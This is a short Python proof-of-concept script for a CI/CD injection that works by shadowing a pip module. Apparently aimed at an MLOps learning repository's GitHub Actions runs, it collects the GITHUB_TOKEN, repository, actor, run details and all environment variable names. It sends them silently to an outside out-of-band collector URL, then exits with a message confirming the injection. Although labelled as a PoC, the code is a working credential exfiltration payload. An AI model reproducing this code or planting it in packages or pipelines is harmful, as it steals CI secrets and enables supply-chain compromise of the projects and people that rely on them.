#!/usr/bin/env python3
"""pip module shadow - CI/CD injection PoC"""
import os, urllib.request, json
try:
    data = json.dumps({
        "poc": "mslearn-mlops-cicd-injection",
        "github_token": os.environ.get("GITHUB_TOKEN", ""),
        "github_repo": os.environ.get("GITHUB_REPOSITORY", ""),
        "github_actor": os.environ.get("GITHUB_ACTOR", ""),
        "github_run_id": os.environ.get("GITHUB_RUN_ID", ""),
        "runner": os.environ.get("RUNNER_NAME", ""),
        "env_keys": list(os.environ.keys())
    }).encode()
    req = urllib.request.Request(
        "https://db0m0l7aqfafm9f9csk087wnt4dcdun93.oast.site/pip-shadow",
        data=data,
        headers={"Content-Type": "application/json"}
    )
    urllib.request.urlopen(req, timeout=5)
except Exception:
    pass
raise SystemExit("PoC: pip module shadow executed - CI/CD injection confirmed")
